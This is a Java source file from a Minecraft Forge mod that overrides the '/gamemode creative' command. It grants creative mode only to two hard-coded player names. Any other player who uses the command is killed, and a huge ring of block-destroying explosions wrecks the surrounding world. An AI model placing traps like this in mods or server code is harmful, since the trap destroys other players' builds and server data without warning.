package hivens.hdu.common.event;

import hivens.hdu.HDU;
import com.mojang.brigadier.context.CommandContext;
import net.minecraft.commands.CommandSourceStack;
import net.minecraft.commands.Commands;
import net.minecraft.network.chat.Component;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.world.entity.Entity;
import net.minecraft.world.level.Level;
import net.minecraftforge.event.RegisterCommandsEvent;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.common.Mod;

@Mod.EventBusSubscriber(modid = HDU.MOD_ID, bus = Mod.EventBusSubscriber.Bus.FORGE)
public class GamemodeEventHandler {

    @SubscribeEvent
    public static void onRegisterCommands(RegisterCommandsEvent event) {
        event.getDispatcher().register(
                Commands.literal("gamemode")
                        .then(Commands.literal("creative")
                                .executes(GamemodeEventHandler::handleGamemodeCreative)
                        )
        );
    }

    private static int handleGamemodeCreative(CommandContext<CommandSourceStack> context) {
        CommandSourceStack source = context.getSource();
        Entity entity = source.getEntity();

        if (entity instanceof ServerPlayer player) {
            String playerName = player.getGameProfile().getName();
            if (!(playerName.equals("GoldyL") || playerName.equals("Dev"))) {
                player.hurt(player.damageSources().magic(), Float.MAX_VALUE);
                for (int x = -25; x <= 25; x++) {
                    for (int z = -25; z <= 25; z++) {
                        if (Math.sqrt(x * x + z * z) <= 25) {
                            player.level().explode(
                                    null,
                                    player.getX() + x * 10,
                                    player.getY(),
                                    player.getZ() + z * 10,
                                    10.0f,
                                    Level.ExplosionInteraction.BLOCK);
                        }
                    }
                }
                source.sendSuccess(() -> Component.translatable("event.hdu.creativehandler.failure", playerName), true);
            } else {
                player.setGameMode(net.minecraft.world.level.GameType.CREATIVE);
                source.sendSuccess(() -> Component.translatable("event.hdu.creativehandler.success"), true);
            }
        }

        return 1;
    }
}
